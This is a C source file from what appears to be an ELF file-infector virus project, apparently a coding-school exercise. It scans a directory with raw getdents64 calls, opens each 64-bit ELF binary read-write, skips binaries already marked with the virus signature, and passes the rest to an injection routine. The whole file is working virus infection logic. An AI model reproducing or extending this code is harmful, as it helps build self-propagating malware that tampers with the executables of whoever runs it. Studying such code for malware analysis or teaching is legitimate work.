#include "ft_virus.h"

# define BUF_SIZE 1024

int FORCE_INLINE signature_present(int fd)
{
	char signature[] = SIGNATURE;
	char buffer[sizeof(signature) - 1];

	// for 5 the size of the jump instruction + 1 for the cipher key
	LSEEK(fd, -1 * ((&payload_end + 6) - &payload_start + (sizeof(signature) - 1)), SEEK_END);
	READ(fd, &buffer, sizeof(signature) - 1);
	if (!ft_memcmp(buffer, signature, sizeof(signature) - 1))
		return (1);
	return (0);

}

int FORCE_INLINE is_good_format(char *filename)
{
	char	buf[BUF_SIZE];
	char	infested_dir[] = INFESTED_DIR;
	char	elfmag[] = ELFMAG;
	int	fd;
	Elf64_Ehdr header;
	size_t	name_size;


	name_size = ft_strlen(filename);
	if (name_size + sizeof(infested_dir) > BUF_SIZE)
		return (-1);
	ft_memcpy(buf, infested_dir, sizeof(infested_dir) - 1);
	ft_memcpy(buf + sizeof(infested_dir) - 1, filename, name_size);
	buf[name_size + sizeof(infested_dir) - 1] = 0;
	fd = OPEN(buf, O_RDWR);
	if (fd < 0)
		return (-1);
	READ(fd, &header, sizeof(header));
	if (ft_memcmp((char*)&header, elfmag, sizeof(elfmag) - 1)
		|| ((char*)&header)[EI_CLASS] != ELFCLASS64
		|| signature_present(fd))
	{
		CLOSE(fd);
		return (-1);
	}
	return (fd);
}

int finder(t_data data, int dir_fd)
{
	int	nread;
	int	bpos;
	struct linux_dirent64 *d;
	char	buf[BUF_SIZE];

	while(1)
	{
		nread = GETDENTS64(dir_fd, buf, BUF_SIZE);
		if (nread < 1)
			return (0);
		bpos = 0;
		while (bpos < nread)
		{
			d = (struct linux_dirent64*)(buf + bpos);
			if (d->d_type == DT_REG &&
					(data.fd = is_good_format(d->d_name)) != -1)
				inject(data);
			bpos += d->d_reclen;
		}
	}
	return (0);
}
